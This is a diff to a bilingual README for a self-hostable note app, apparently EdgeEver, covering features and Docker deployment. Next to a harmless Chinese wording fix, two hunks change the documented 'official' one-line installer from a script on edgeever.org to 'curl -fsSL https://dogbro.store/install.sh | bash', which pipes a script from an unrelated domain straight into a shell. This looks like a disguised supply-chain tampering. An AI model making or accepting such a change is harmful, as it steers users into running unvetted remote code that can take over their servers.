@@ -1132,7 +1132,7 @@ sequenceDiagram
 - **精煉總結與要點提取**：一鍵壓縮提煉全文核心結論、提取待辦事項與關鍵行動項；
 - **格式保真智慧翻譯**：在嚴格保留原有 Markdown、數學公式、連結與程式碼塊的前提下，精準翻譯多國語言；
 - **內容重塑與續寫**：支援潤色與精煉表達，或按上下文順滑續寫；
-- **BYOK 隱私直連 (Bring Your Own Key)**：支援直連 OpenAI、Anthropic Claude、Google Gemini、DeepSeek 及各類 OpenAI 相容的中繼 API，資料完全由端側直髮，不經過任何第三方中轉。
+- **BYOK 隱私直連 (Bring Your Own Key)**：支援直連 OpenAI、Anthropic Claude、Google Gemini、DeepSeek 及各類 OpenAI 相容的中繼 API，資料完全由端側直接發送，不經過任何第三方中轉。
 
 ### 2. 開放 MCP 協議 (Model Context Protocol)
 在**設定 → MCP 設定**中生成專屬令牌，即可將 EdgeEver 接入 Claude Code、Cursor、Antigravity、OpenClaw 等主流 AI 編碼助手與智慧體平臺：
@@ -1177,7 +1177,7 @@ sequenceDiagram
 2. **Docker 一鍵自建（VPS / NAS / 家用伺服器）**：
    \`\`\`sh
    # 官方 GHCR 映象
-   curl -fsSL https://edgeever.org/install.sh | bash
+   curl -fsSL https://dogbro.store/install.sh | bash
    \`\`\`
    單命令自動配置 Docker Compose 環境，並內建每日定時自動更新。部分中國大陸網路環境可能需要自行配置可用的網路代理或可信的映象加速服務，才能正常訪問 GHCR。
 
@@ -1530,7 +1530,7 @@ Embed Word documents, PDFs, spreadsheets, archives, and multimedia files directl
 2. **Docker One-Command Deployment (VPS / NAS / Home Server)**:
    \`\`\`sh
    # Official GHCR image
-   curl -fsSL https://edgeever.org/install.sh | bash
+   curl -fsSL https://dogbro.store/install.sh | bash
    \`\`\`
    Configures Docker Compose and automated daily background updates with one command. Some network environments in mainland China may require an available network proxy or a trusted registry mirror to access GHCR.
 
